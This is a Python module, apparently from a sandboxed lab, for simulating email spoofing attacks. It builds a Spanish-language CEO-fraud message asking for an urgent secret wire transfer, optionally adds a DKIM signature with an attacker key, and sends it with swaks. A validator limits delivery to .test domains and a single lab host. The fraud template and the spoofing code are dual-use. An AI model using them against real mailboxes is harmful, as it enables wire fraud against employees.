"""Piezas comunes de los ataques: validación de destino, mensaje, firma DKIM y envío con swaks."""

from __future__ import annotations

import re
import subprocess
import uuid
from dataclasses import asdict, dataclass
from email.message import EmailMessage
from email.policy import SMTP
from email.utils import formatdate
from pathlib import Path

import dkim

# Regla 3 de CLAUDE.md: solo dominios .test y solo el host «receptor».
ALLOWED_SERVER = "receptor"
DEFAULT_RECIPIENT = "empleado@bancoseguro.test"
_TEST_DOMAIN = re.compile(r"^[a-z0-9-]+(\.[a-z0-9-]+)*\.test$")

KEYS_DIR = Path("/run/atacante/llaves")
# Cabeceras que firma el atacante (las mismas que firmaría un servidor normal).
SIGNED_HEADERS = [b"From", b"To", b"Subject", b"Date", b"Message-ID", b"MIME-Version",
                  b"Content-Type", b"Content-Transfer-Encoding"]  # fmt: skip

SUBJECT = "Transferencia urgente"
ATTACKER_ACCOUNT = "9999-6666-00"
BODY = f"""Hola:

Necesito que hoy mismo hagas una transferencia de 48.500 USD a la cuenta
{ATTACKER_ACCOUNT} (Consultores Asociados). Es para cerrar una adquisición
confidencial, así que no lo comentes con nadie todavía.

Estoy en reuniones toda la tarde; respóndeme solo por correo cuando esté hecho.

Gracias,
Director General
Banco Seguro
"""


class DestinationError(ValueError):
    """El destino no es del laboratorio: el ataque no se envía."""


class AttackError(RuntimeError):
    """El ataque no se puede preparar (mensaje en español para mostrar)."""


def validate_destination(recipient: str, server: str) -> None:
    """Aborta si el destinatario no es de un dominio .test o el servidor no es «receptor»."""
    domain = recipient.rpartition("@")[2].lower()
    if "@" not in recipient or not _TEST_DOMAIN.match(domain):
        raise DestinationError(
            f"Destinatario no permitido: «{recipient}». Este laboratorio solo envía "
            "correo a dominios .test (RFC 2606). No se envió nada."
        )
    if server != ALLOWED_SERVER:
        raise DestinationError(
            f"Servidor no permitido: «{server}». Los ataques solo pueden ir al host "
            f"«{ALLOWED_SERVER}» del laboratorio. No se envió nada."
        )


@dataclass(frozen=True)
class Attack:
    id: str
    description: str
    envelope_from: str  # MAIL FROM (sobre)
    header_from: str  # From: (lo que ve el usuario)
    dkim: str  # firma DKIM que lleva


@dataclass
class AttackResult:
    attack: str
    accepted: bool
    code: int
    reply: str
    message_id: str
    envelope_from: str
    header_from: str
    transcript: str
    note: str = ""

    def to_dict(self) -> dict[str, object]:
        return asdict(self)


def domain_of(address: str) -> str:
    return address.rpartition("@")[2].strip('<>" ').lower()


def build_message(attack: Attack, recipient: str) -> tuple[bytes, str]:
    """Mensaje del fraude con el From: del ataque. Devuelve (bytes con CRLF, Message-ID)."""
    message_id = f"{uuid.uuid4()}@{domain_of(attack.header_from)}"
    msg = EmailMessage(policy=SMTP)
    msg["From"] = attack.header_from
    msg["To"] = recipient
    msg["Subject"] = SUBJECT
    msg["Date"] = formatdate(localtime=True)
    msg["Message-ID"] = f"<{message_id}>"
    msg.set_content(BODY)
    return msg.as_bytes(), message_id


def dkim_sign(raw: bytes, domain: str, selector: str) -> bytes:
    """Agrega una firma DKIM válida de `domain` con la llave del atacante."""
    key = (KEYS_DIR / f"{selector}.private").read_bytes()
    signature = dkim.sign(
        raw,
        selector.encode(),
        domain.encode(),
        key,
        canonicalize=(b"relaxed", b"relaxed"),
        include_headers=SIGNED_HEADERS,
    )
    return signature + raw


_REPLY = re.compile(r"^<(-|\*\*) +(\d{3})[ -](.*)$")


def summarize_swaks(transcript: str) -> tuple[int, str]:
    """Devuelve (código, texto) de la respuesta que decide el destino del correo.

    Si el servidor rechazó algo (líneas `<**`), es el primer rechazo. Si no, es la
    respuesta al final de DATA, la última antes de QUIT.
    """
    replies: list[tuple[bool, int, str]] = []
    for line in transcript.splitlines():
        if line.strip() == "-> QUIT":
            break
        match = _REPLY.match(line.strip())
        if match:
            replies.append((match.group(1) == "**", int(match.group(2)), match.group(3)))
    for is_error, code, text in replies:
        if is_error:
            return code, text
    if not replies:
        return 0, "Sin respuesta del servidor"
    _, code, text = replies[-1]
    return code, text


def send_raw(
    attack: Attack,
    raw: bytes,
    message_id: str,
    recipient: str = DEFAULT_RECIPIENT,
    server: str = ALLOWED_SERVER,
    note: str = "",
) -> AttackResult:
    """Envía el mensaje tal cual con swaks desde la IP del atacante."""
    validate_destination(recipient, server)
    cmd = [
        "swaks",
        "--server", server,
        "--port", "25",
        "--helo", "mail.atacante.test",
        "--from", attack.envelope_from,
        "--to", recipient,
        "--data", "-",  # el mensaje completo llega por la entrada estándar
        "--suppress-data",
        "--timeout", "30",
    ]  # fmt: skip
    proc = subprocess.run(cmd, input=raw, capture_output=True, timeout=60, check=False)
    transcript = (proc.stdout + proc.stderr).decode(errors="replace")
    code, reply = summarize_swaks(transcript)
    return AttackResult(
        attack=attack.id,
        accepted=200 <= code < 300,
        code=code,
        reply=reply,
        message_id=message_id,
        envelope_from=attack.envelope_from,
        header_from=attack.header_from,
        transcript=transcript,
        note=note,
    )


def send_simple(
    attack: Attack,
    recipient: str = DEFAULT_RECIPIENT,
    server: str = ALLOWED_SERVER,
    sign_with: tuple[str, str] | None = None,
) -> AttackResult:
    """Arma el mensaje del fraude, lo firma si se pide (dominio, selector) y lo envía."""
    validate_destination(recipient, server)
    raw, message_id = build_message(attack, recipient)
    if sign_with:
        raw = dkim_sign(raw, *sign_with)
    return send_raw(attack, raw, message_id, recipient, server)
